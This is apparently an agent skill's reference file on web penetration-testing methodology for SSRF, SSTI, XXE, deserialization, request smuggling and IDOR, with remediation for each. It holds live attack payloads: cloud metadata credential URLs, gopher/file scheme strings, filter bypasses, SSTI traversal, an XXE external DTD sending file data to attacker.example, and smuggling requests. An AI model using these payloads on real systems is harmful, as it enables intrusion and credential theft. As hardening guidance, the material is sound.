# Web AppSec Methodology -- Per-Vector Reference

Deep attacker-perspective methodology for the Step 5 injection and access-control family of [`../SKILL.md`](../SKILL.md): SSRF, SSTI, XXE, insecure deserialization, HTTP request smuggling, and IDOR. The SKILL.md body carries the applicability checks, the attacker approach, and the remediation summary for each vector; this file carries the engine-specific probes, filter-bypass catalogs, and language-specific gadget notes that would otherwise inflate the always-on-trigger body.

## Authorized use only

This is offensive methodology re-authored to harden the system under test. Use it only inside an authorized engagement with documented scope and rules of engagement. Every payload here is benign and points at a reserved placeholder destination (`attacker.example`) or an in-scope internal host - never a real third-party target, and never moving real data. The deliverable of any assessment is the defensive control, not the exploit. Each section ends with the remediation that closes the class.

## How to read this file

For each vector: **Reach** (confirm the sink is reachable with attacker-influenced input), **Confirm** (a benign probe that proves the behavior), **Escalate** (how far the class goes, demonstrated only as far as the RoE allows), and **Defend** (the control). Stop at Confirm unless the engagement explicitly authorizes escalation.

---

## SSRF -- Server-Side Request Forgery

**Reach**: any server-initiated request whose URL, host, or scheme is influenced by user input - webhooks, link previews, URL imports, PDF/image/document converters, SSO/OIDC metadata fetch, server-side `fetch`/`curl`/`requests.get`, XML/PDF renderers that follow remote references.

**Confirm**: point the fetch at an in-scope internal host or the cloud metadata service and observe a response, a timing difference, or an out-of-band callback.

```text
# Internal services the attacker cannot reach directly
http://127.0.0.1:8080/admin
http://10.0.0.5:6379/                          # internal Redis
http://[::1]:8500/v1/agent/services            # internal service mesh

# Cloud instance metadata (the highest-value SSRF target -- credential theft)
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS IMDSv1
http://metadata.google.internal/computeMetadata/v1/instance/        # GCP (needs Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=2021-02-01     # Azure (needs Metadata: true)

# Protocol smuggling when the client honors non-HTTP schemes
gopher://127.0.0.1:6379/_<url-encoded-redis-command>
file:///etc/passwd
dict://127.0.0.1:11211/stats
```

**Escalate -- filter bypasses** (the finding is usually the bypass, not the naive request):

```text
# Allowlist checks the literal string "localhost" but not its equivalents
http://127.0.0.1   http://0.0.0.0   http://0177.0.0.1   http://2130706433   http://[::ffff:127.0.0.1]

# Authority confusion -- the part before @ is the userinfo, the real host is after
http://allowed.example@127.0.0.1/

# Open redirect on an allowed host that 30x-es to an internal target
https://allowed.example/redirect?to=http://169.254.169.254/

# DNS rebinding -- the name resolves to a public IP at allowlist-check time,
# then to an internal IP at fetch time (TOCTOU between check and use)
http://rebind.attacker.example/    # A record flips public -> 169.254.169.254
```

**Blind SSRF**: when the response body is not reflected, confirm via an out-of-band interaction - have the target resolve/fetch a unique subdomain of `attacker.example` and watch for the DNS/HTTP callback. The presence of the callback proves reach even with no response body.

**Defend**:

- Allowlist destination hosts, then resolve-and-pin the IP and re-validate after every redirect (defeats the rebinding/redirect TOCTOU).
- Block link-local (`169.254.0.0/16`), loopback, and RFC-1918 ranges at the egress/network layer, not only in application code.
- Require IMDSv2 (token-bound, hop-limited) on cloud hosts; IMDSv1 is directly reachable by any SSRF.
- Disable unused URL schemes (`gopher://`, `file://`, `dict://`, `ftp://`); allow only `https://` (and `http://` if required).

---

## SSTI -- Server-Side Template Injection

**Reach**: user input concatenated into a server-side template source - email/report/invoice generators, themable pages, CMS "custom template" features, "personalized message" fields rendered by a template engine.

**Confirm**: send an arithmetic probe per engine syntax and look for the *evaluated* result in the response.

```text
{{7*7}}        # Jinja2, Twig, Nunjucks, Django-ish  -> 49 means evaluation
${7*7}         # Freemarker, JSP EL, Thymeleaf
#{7*7}         # Ruby string interpolation, some EL dialects
<%= 7*7 %>     # ERB (Ruby), EJS
{7*7}          # some lightweight engines
${{7*7}}  #{ 7*7 }   @(7*7)   *{7*7}     # polyglot probes across engines
```

**Escalate**: evaluation means access to the engine's object graph; on most engines that reaches code execution through built-in objects. Confirm reach by traversing to a safe attribute and printing a fixed marker - do NOT run a live system command unless the RoE explicitly authorizes it.

```text
# Jinja2: object-graph traversal proves reach; stop at a benign marker
{{ config }}                          # leaks app config -> reach confirmed
{{ ''.__class__.__mro__ }}            # reaches the object graph
# from here engine-specific gadgets reach subprocess/os; demonstrate only a
# fixed benign string (e.g. {{ "SSTI-OK" }}) under RoE, never a real command
```

**Defend**:

- Never compile a template from user input. Pass user data as *bound context* to a static, file-based template.
- Prefer a logic-less engine (Mustache) for user-influenced content; if the engine supports a sandbox, enable it - but treat the sandbox as defense-in-depth, not the primary control.
- Rate SSTI at RCE-class severity in the report; it is rarely "just" reflected output.

---

## XXE -- XML External Entity

**Reach**: any XML parsed from an untrusted source - SOAP, SAML assertions, SVG uploads, DOCX/XLSX/ODF (zipped XML), RSS/Atom, XML-RPC, SVG-to-PNG renderers, XML configuration import.

**Confirm -- inline file disclosure** (when the entity is reflected in the response):

```text
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/hostname"> ]>
<r>&x;</r>
```

**Escalate -- blind / out-of-band** (when nothing is reflected, exfiltrate via an external DTD on a placeholder host):

```text
<!-- in-band request references an external DTD -->
<?xml version="1.0"?>
<!DOCTYPE r SYSTEM "http://attacker.example/evil.dtd">
<r>probe</r>

<!-- evil.dtd hosted on the in-scope/placeholder collector defines a
     parameter entity that calls back, proving blind XXE without reflection -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://attacker.example/?x=%file;'>">
%wrap; %send;
```

**Denial of service** (recursive entity expansion -- "billion laughs"): nested entities that expand exponentially. Confirm only with a small bounded expansion to avoid taking the target down.

**Defend**: disable DOCTYPE/DTD processing and external-entity resolution on every parser (`libxml`: do not set `noent`; Java: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`; .NET: leave `XmlResolver = null`). For SVG/Office uploads, parse with entities off and validate against a schema. Prefer a parser that is secure by default.

---

## Insecure Deserialization

**Reach**: untrusted bytes deserialized into language-native objects. JSON-into-DTO with explicit field binding does NOT qualify - the risk is *native object* deserialization where construction has side effects.

**Per-language sinks** (presence of these on request data is the finding):

```text
Python   pickle.loads(...)            yaml.load(...)  # without SafeLoader
Java     ObjectInputStream.readObject(...)            # native serialization
PHP      unserialize($_POST[...])
.NET     BinaryFormatter.Deserialize(...)   LosFormatter   NetDataContractSerializer
Ruby     Marshal.load(...)
Node     deserialize from node-serialize / funcster style libs
```

**Escalate -- gadget chains**: the exploit is not the payload format but a *gadget chain* - existing classes already on the classpath/loaded whose deserialization side effects compose into code execution (e.g. ysoserial-style chains for Java, `__reduce__` for pickle, POP chains for PHP). For an assessment, confirm (a) the vulnerable sink receives untrusted input and (b) a known gadget source is present; do not ship a weaponized chain into a live system. The proof of reach is enough for an RCE-class finding.

**Defend**: do not deserialize native objects from untrusted input. Use a data-only format (JSON, Protobuf, MessagePack) with explicit schema/field binding. If native deserialization is unavoidable, enforce a strict class allowlist (look-ahead deserialization), sign the payload, and run the parser with least privilege.

---

## HTTP Request Smuggling (HTTP Desync)

**Reach**: a front-end/back-end pair (CDN, reverse proxy, load balancer, WAF in front of an app server) that may disagree on where one request ends and the next begins. A single server with no intermediary cannot be desynchronized.

**Confirm** (timing-based detection is the safe first step -- a vulnerable TE.CL config hangs waiting for bytes that never arrive):

```text
# CL.TE -- front-end uses Content-Length, back-end uses Transfer-Encoding
POST / HTTP/1.1
Host: target.example
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

# TE.CL -- front-end uses Transfer-Encoding, back-end uses Content-Length
# TE.TE -- both support TE, but one is tricked by an obfuscated header:
Transfer-Encoding: chunked
Transfer-Encoding : chunked        # space before colon
Transfer-Encoding: xchunked
Transfer-Encoding:[tab]chunked
```

**Escalate**: a successful desync leaves an unconsumed prefix in the back-end's connection buffer that is prepended to the *next* client's request - enabling request hijacking, credential capture, cache poisoning, and front-end control bypass. Confirm impact carefully on an in-scope, low-traffic target; the side effects hit real adjacent users.

**Defend**: normalize or reject ambiguous requests at the front-end (reject any message carrying both `Content-Length` and `Transfer-Encoding`); use HTTP/2 end-to-end where possible (it frames length unambiguously) and watch for HTTP/2-to-HTTP/1.1 downgrade smuggling at the edge; disable back-end connection reuse for upstream pools facing untrusted input.

---

## IDOR / Broken Object-Level Authorization (BOLA)

**Reach**: any endpoint that accepts an object identifier (numeric ID, UUID, filename, account/order number, GraphQL node id) and returns or mutates that object.

**Confirm -- horizontal and vertical**:

```text
# Authenticate as low-priv user A, capture a request, swap the identifier
GET  /api/invoices/1001        ->  GET  /api/invoices/1002      # another tenant (horizontal)
GET  /api/users/me/settings    ->  GET  /api/users/42/settings  # arbitrary user
POST /api/admin/reports/7      # admin-only object accessed as a normal user (vertical)
```

**Escalate -- mass assignment** (the write-side sibling): submit fields the UI never exposes and see if they are bound.

```text
# UI form sends {"name": "...", "email": "..."}; attacker adds privileged fields
{"name": "...", "email": "...", "role": "admin", "is_verified": true, "owner_id": 42}
```

**Probe systematically**: enumerate sequential IDs; for UUIDs, harvest identifiers from prior responses, referrers, logs, and shared links (UUID unguessability is not authorization). Check every verb (GET/PUT/PATCH/DELETE) - read access may be guarded while the delete path is not.

**Defend**: enforce object-level authorization at the data layer on every access - scope every query to the authenticated principal (`WHERE owner_id = :current_user`), not just a route guard. Bind writes to an explicit field allowlist (never `Model(**request.json)` / mass-assign the whole body). Treat unguessable identifiers as defense-in-depth only.

---

## Standards mapping

| Vector | OWASP WSTG | CWE | OWASP Top 10 (2021) |
|--------|-----------|-----|---------------------|
| SSRF | WSTG-INPV-19 | CWE-918 | A10 |
| SSTI | WSTG-INPV-18 | CWE-1336 / CWE-94 | A03 |
| XXE | WSTG-INPV-07 | CWE-611 | A05 |
| Insecure deserialization | WSTG-INPV-11 (input) | CWE-502 | A08 |
| HTTP request smuggling | WSTG-INPV-16 (HTTP splitting/smuggling) | CWE-444 | A06-adjacent |
| IDOR / BOLA | WSTG-ATHZ-04 | CWE-639 / CWE-284 | A01 |

These identifiers feed `pentest-reporting` (for the finding write-up) and `security-framework-mapping` (for cross-framework coverage).
